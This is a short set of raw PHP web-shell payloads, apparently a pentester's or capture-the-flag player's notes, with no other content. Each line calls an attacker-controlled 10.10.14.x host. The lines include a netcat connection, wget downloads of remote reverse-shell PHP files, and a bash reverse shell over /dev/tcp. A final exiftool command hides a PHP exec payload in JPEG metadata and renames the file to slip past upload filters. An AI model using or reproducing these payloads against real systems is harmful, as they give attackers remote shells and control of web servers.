<? passthru(nc 10.10.14.156 1234) ?> 


<?php exec("wget http://10.10.14.56:8888/rev.php"); ?>


<?php exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.14.56/9211 0>&1'"); ?>

exiftool -DocumentName='<?php exec("wget http://10.10.14.56:8888/mrev.php"); ?>' act.jpeg  -- afterwards change .jpeg to .php.jpeg

